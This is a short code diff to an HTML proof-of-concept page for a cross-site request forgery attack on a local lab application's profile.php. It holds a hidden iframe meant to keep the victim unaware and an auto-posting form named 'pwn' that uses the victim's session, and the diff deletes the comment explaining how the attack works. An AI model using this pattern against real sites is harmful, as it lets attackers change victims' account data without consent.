@@ -63,13 +63,9 @@
         <span class="small">Do not close this page.</span>
     </div>
 
-    <!-- Hidden iframe so the visible page does not navigate after the POST. -->
+    <!-- hidden iframe for response to avoid alerting the user -->
     <iframe name="csrf_sink" style="display:none !important;"></iframe>
 
-    <!-- The actual CSRF payload: a normal HTML form, no JavaScript needed
-         beyond .submit(). The browser auto-attaches PHPSESSID for the
-         target origin, the server sees a normal authenticated POST, and
-         the UPDATE runs. -->
     <form id="pwn"
           action="http://localhost/CyberProject/profile.php"
           method="POST"
